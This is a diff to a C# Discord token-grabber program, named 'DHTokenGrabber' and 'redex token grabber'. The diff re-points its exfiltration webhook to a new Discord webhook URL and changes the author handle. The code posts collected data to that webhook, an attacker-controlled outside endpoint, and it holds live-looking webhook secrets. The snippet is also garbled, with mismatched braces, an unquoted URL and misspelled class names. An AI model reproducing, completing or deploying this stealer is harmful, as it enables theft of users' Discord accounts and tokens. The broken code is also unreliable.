@@ -1,4 +1,4 @@
-https://discord.com/api/webhooks/933088772256579625/cvD00s18NiKU1JapiooNkjo1XOAjTDLwHSIMITlg95O3ztZAkvwaSeEBmMLSrsrWAwj3
+https://discord.com/api/webhooks/933088767940632626/Ln79KSb_lbsedPzVG73QjFBFF2CxS7IwF6WdAOBiWKUpONrWlU7q4aKf2K-S0TbeytwY
 staff
 namespace DHTokenGrabber
 {   
@@ -59,7 +59,7 @@ catch (Exception)
      string result;
      try
  }
-  result = new httpClient().GetStringAsync("https://discord.com/api/webhooks/933088772256579625/cvD00s18NiKU1JapiooNkjo1XOAjTDLwHSIMITlg95O3ztZAkvwaSeEBmMLSrsrWAwj3").result;
+  result = new httpClient().GetStringAsync("https://discord.com/api/webhooks/933088767940632626/Ln79KSb_lbsedPzVG73QjFBFF2CxS7IwF6WdAOBiWKUpONrWlU7q4aKf2K-S0TbeytwY").result;
 }
 catch (WebException)
 }
@@ -84,15 +84,15 @@ public static void sendWebHook(string discordWebHook,string content)
                 }) + "´´´"
             },
             {
-                "AlbeiroDos1131#5222"
+                "⛧♱𝖎𝖇𝖊𝖓𝖑𝖆𝖓𝖉⛧#9921"
                 "redex token grabber"
             },
             {
-                "Discord undefined//discord.com/assets/652f40427e1f5186ad54836074898279.png"
+                "Discord discord.com/assets/652f40427e1f5186ad54836074898279.png"
 
             }
         };
-        httpClient.PostAsync(https://discord.com/api/webhooks/933088772256579625/cvD00s18NiKU1JapiooNkjo1XOAjTDLwHSIMITlg95O3ztZAkvwaSeEBmMLSrsrWAwj3, new ForUrlcodedContent(nameValuecollection)).GetAwaiter().GetResult();
+        httpClient.PostAsync(https://discord.com/api/webhooks/933088767940632626/Ln79KSb_lbsedPzVG73QjFBFF2CxS7IwF6WdAOBiWKUpONrWlU7q4aKf2K-S0TbeytwY, new ForUrlcodedContent(nameValuecollection)).GetAwaiter().GetResult();
         catch (WebException)
         {
         }
